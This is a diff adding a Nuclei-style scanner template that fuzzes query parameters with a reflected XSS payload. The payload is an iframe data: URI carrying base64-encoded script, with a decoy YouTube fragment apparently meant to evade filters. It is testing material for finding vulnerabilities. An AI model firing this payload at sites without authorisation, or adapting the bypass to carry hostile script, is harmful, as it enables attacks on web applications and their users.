@@ -1,0 +1,36 @@
+id: iframe-bypass-xss
+
+info:
+  name: XSS Iframe
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      xss:
+        - '"><iframe src="data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<iframe src="'
+          
+      - type: word
+        part: header
+        words:
+          - text/html
